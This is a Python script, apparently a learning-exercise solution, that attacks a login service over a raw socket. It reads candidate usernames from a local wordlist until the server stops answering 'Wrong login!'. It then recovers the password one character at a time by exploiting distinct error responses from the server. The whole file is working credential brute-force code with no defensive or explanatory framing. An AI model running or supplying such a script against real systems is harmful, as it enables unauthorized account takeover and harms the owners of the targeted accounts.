import sys
import socket
import json
from string import ascii_letters, digits


with (socket.socket() as cs):
    hostname = sys.argv[1]
    port = int(sys.argv[2])

    address = (hostname, port)
    cs.connect(address)

    file_path = "C:/Users/bullb/Downloads/logins.txt"

    json_format = {"login": "", "password": "aa"}

    chars = ascii_letters + digits

    found_log = False

    with open(file_path, 'r') as file:
        for line in file:
            if found_log:
                break
            json_format['login'] = line.replace("\n", "")
            json_data = json.dumps(json_format)
            log_pw = json_data.encode()
            cs.send(log_pw)
            response = json.loads(cs.recv(1024).decode())

            if response['result'] != "Wrong login!":
                found_log = True
                break

    found_pw = False
    code = ''
    while not found_pw:
        for chr_ in chars:
            if found_pw:
                break
            value = code + chr_
            json_format["password"] = value
            json_data = json.dumps(json_format)
            log_pw = json_data.encode()
            cs.send(log_pw)
            response = json.loads(cs.recv(1024).decode())
            if response['result'] == "Connection success!":
                print(json_data)
                found_pw = True
                break
            if response['result'] != "Wrong password!":
                code = value